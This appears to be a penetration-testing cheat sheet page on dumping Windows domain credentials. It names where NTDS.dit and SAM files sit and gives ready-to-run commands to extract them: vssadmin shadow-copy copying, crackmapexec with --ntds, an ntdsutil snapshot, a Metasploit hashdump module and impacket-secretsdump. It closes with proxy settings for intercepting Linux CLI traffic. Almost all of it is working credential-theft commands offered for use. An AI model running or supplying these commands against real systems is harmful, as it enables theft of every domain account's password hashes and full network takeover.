---
description: other miscellaneous
---

# Others

## Dump NTDS

### NTDS file location 

`c:\windows\ntds\ntds.dit` 

Backup files if contain sam 

`Windows/system32/config/SAM` 

`/WINDOWS/repair/SAM` 

`regedit.exe HKEY_LOCAL_MACHINE -> SAM` 

### Manual NTDS.dit Extraction using vssadmin 

```text
vssadmin create shadow /for=C: 
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit c:\ntds.dit 
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\SYSTEM c:\SYSTEM 
```

### Dump NTDS.dit with Crackmapexec 

`crackmapexec smb <target>-u admin -p Password123 -d domain --ntds drsuapi` 

### ntdsutil 

```text
activate instance ntds 
ifm 
create full C:\ntdsutil 
quit 
quit 
```

Get files from:  

c:\ntdsutil\active directory 

### Metasploit 

`windows/gather/credentials/domain_hashdump` 

### Impacket 

`impacket-secretsdump -system /root/SYSTEM -ntds /root/ntds.dit LOCAL` 

## Intercept Linux CLI Traffic

{% embed url="https://frichetten.com/blog/intercept-linux-cli-tool-traffic" %}

```text
export http_proxy="http://192.168.122.1:8080" 
export https_proxy="http://192.168.122.1:8080" 
```

